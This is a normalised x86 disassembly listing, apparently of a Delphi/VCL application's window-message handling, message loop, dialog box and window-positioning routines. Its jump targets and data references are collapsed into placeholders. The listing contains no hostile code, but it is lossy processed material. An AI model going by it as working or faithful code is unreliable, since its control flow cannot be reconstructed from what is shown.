add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4617f0
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_461118
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_4617a8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_460fcc
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov dx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_462210
jmp r-xdata
cmp eax 0x16
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov edx esi
call sub_4161a0
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1d
jg r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov esi eax
mov eax esi
call sub_448484
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x37
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb0 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4630d8
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_461d2c
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_461cd0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax esi
call sub_448484
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xf2 ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xfa ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4617f0
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x13
je r-xdata
mov eax [ rw-data ]
call sub_460634
push ebp
call sub_461090
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x9c ] 0x1
jmp r-xdata
push ebp
call sub_461090
pop ecx
jmp [ eax * 4 + jump_table_4611bc ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
jmp r-xdata
mov eax esi
call sub_448484
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_461b90
test al al
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax ] 0xde534454
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_44ccd0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_461024
push ebp
call sub_461090
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_461090
pop ecx
jmp r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
push ebp
call sub_461090
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
call sub_41e078
jmp r-xdata
xor eax eax
call sub_459038
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov ebx eax
mov eax esi
call sub_448484
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax esi
call sub_442f30
push ebx
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46180c
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9e ] 0x0
je r-xdata
push ebp
call sub_461090
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x9d ] al
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
call sub_45e89c
jmp r-xdata
push ebp
call sub_461090
pop ecx
jmp r-xdata
push ebp
call sub_4610cc
pop ecx
jmp r-xdata
push ebp
call sub_461090
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xac ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_460f30
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4618bc
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_460f20
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_460f30
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_460f28
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_458ee8
mov edx [ ebp - 0x4 ]
mov [ edx + 0xac ] eax
push ebp
call sub_461090
pop ecx
jmp r-xdata
call sub_458f9c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xac ] edx
push ebp
call sub_461090
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx 0x8000
mov eax r-xdata
call sub_40db88
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
call GetLastError
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
push eax
call GetProcAddress
mov esi eax
mov ebx esi
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
push edx
mov edx [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call ebx
jmp r-xdata
sub_46180c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_460f20
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x30 ]
call sub_4608b4
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ ebx + 0x44 ]
call sub_448484
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push 0x40
push 0x0
mov esi [ ebx + 0x44 ]
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x44 ]
push eax
mov eax [ esi + 0x40 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_448484
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
cmp [ ebx + 0x102 ] 0x0
je r-xdata
sub_4618bc
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x9
mov eax [ ebx + 0x30 ]
call sub_4608b4
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebx + 0x44 ]
call sub_448484
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
adc eax 0x0
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
mov eax ebx
call sub_460f30
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
cmp [ ebx + 0x10a ] 0x0
je r-xdata
mov eax esi
call sub_448484
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
xor edx edx
call sub_45c66c
mov eax [ ebx + 0x44 ]
call sub_45ea44
sub_4619bc
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_4619f8
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_404480
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call GetWindowTextA
mov ecx eax
mov edx esp
mov eax esi
call sub_40451c
jmp r-xdata
add esp 0x100
pop esi
pop ebx
retn
sub_461a44
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0xb0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push esi
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
sub_461a68
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x22f ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
push edi
mov eax [ esi + 0x254 ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_461aa4
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x108
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push 0xfffffffa
push ebp
call GetWindowLongA
cmp eax [ rw-data ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax ebp
call sub_43ec78
test eax eax
jne r-xdata
cmp ebp [ eax + 0x254 ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_448484
mov ebp eax
jmp r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov bl 0x1
jmp r-xdata
sub_461b5c
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd8 ]
test al al
je r-xdata
mov eax ebp
call sub_462aa4
sub_461b90
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x112 ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_448484
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffab
call sub_4038bc
test al al
jne r-xdata
sub_461bfc
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
mov [ esi + 0x9c ] 0x1
mov [ esp ] 0x0
cmp [ esi + 0xd2 ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_461b5c
test al al
jne r-xdata
mov ecx esp
mov edx edi
mov eax [ esi + 0xd4 ]
call [ esi + 0xd0 ]
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_461a68
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_461aa4
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_461a44
test al al
jne r-xdata
push edi
call TranslateMessage
push edi
call DispatchMessageA
jmp r-xdata
sub_461cac
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_461bfc
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_462550
sub_461cd0
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
call sub_416180
mov eax 0x8
call sub_402744
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xa8 ]
call sub_416044
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call SendMessageA
jmp r-xdata
sub_461d2c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call SendMessageA
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_4161a0
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_402764
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_416090
jmp r-xdata
sub_461dc0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax ebx
call [ eax - 0xc ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
xor eax eax
push ebp
push j_sub_403ba0#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
or edx 0xffffffff
mov eax ebx
mov edi [ eax ]
call [ edi + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov edi ebx
mov eax edi
call sub_448460
mov [ esi + 0x44 ] edi
sub_461e40
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x1
xor edx edx
push ebp
push sub_461f1e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_458e60
call sub_4085e8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461f25
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_45c66c
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push j_sub_403ba0#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_461cac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
je r-xdata
mov [ eax + 0x22b ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov dl 0x1
call sub_45b640
mov eax [ ebp - 0x4 ]
call sub_46180c
jmp r-xdata
sub_461f40
push ebx
push esi
mov esi edx
mov ebx eax
call GetCapture
test eax eax
je r-xdata
call sub_4027d4
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
call sub_4027f4
push eax
call sub_4027d4
pop edx
call sub_40beec
call sub_4027d4
mov edx [ r-xdata ]
call sub_40384c
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xca ] 0x0
je r-xdata
call sub_4027d4
mov edx eax
mov eax ebx
call sub_462138
pop esi
pop ebx
retn
call sub_4027d4
mov ecx eax
mov edx esi
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
jmp r-xdata
sub_461fd0
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
call GetActiveWindow
mov [ ebp - 0xc ] eax
push 0x2
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x14 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
xor eax eax
call sub_458ee8
mov [ ebp - 0x10 ] eax
call sub_458e04
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_460f9c
test al al
je r-xdata
mov [ ebp - 0x44 ] 0x28
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x3c ]
sub ecx edx
sar ecx 0x1
jns r-xdata
xor ecx ecx
push ebp
push sub_462125
push [ fs : ecx ]
mov [ fs : ecx ] esp
push ebx
push edi
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call MessageBoxA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46212c
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
or ebx 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x40 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x10 ]
call sub_458f9c
mov eax [ ebp - 0xc ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x1c ]
call sub_458e0c
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x50 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x54 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
sub_462138
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4621f3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_4044c4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_4619f8
mov eax [ ebp - 0x108 ]
call sub_4048dc
push eax
mov eax [ ebp - 0x4 ]
call sub_4048dc
mov edx eax
mov eax ebx
pop ecx
call sub_461fd0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4621fa
lea eax [ ebp - 0x108 ]
call sub_40442c
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
mov eax [ ebp - 0x4 ]
call sub_408e1c
mov edx eax
lea eax [ ebp - 0x104 ]
call sub_4031c4
lea eax [ ebp - 0x104 ]
mov edx r-xdata
call sub_402ed0
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4046ec
sub_462210
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] dx
mov esi eax
xor ebx ebx
mov [ esp + 0x8 ] 0x1
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
cmp [ esi + 0xda ] 0x0
je r-xdata
cmp [ edi + 0x2aa ] 0x0
je r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ esi + 0xdc ]
call [ esi + 0xd8 ]
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ edi + 0x2ac ]
call [ edi + 0x2a8 ]
mov ebx eax
jmp r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test edi edi
je r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_448788
test al al
je r-xdata
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov ebp [ esi + 0x30 ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x23c ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
push eax
movzx eax [ esp + 0x4 ]
push eax
push 0xb01f
mov eax [ esi + 0x30 ]
push eax
call PostMessageA
mov eax esi
call sub_462884
test al al
je r-xdata
call sub_448484
mov ebp eax
mov eax edi
call sub_448484
mov ebp eax
mov eax esi
call sub_462884
test al al
je r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ edi + 0x23c ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
sub_462340
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_462398
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_462884
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_46304c
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46239f
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_4623a8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
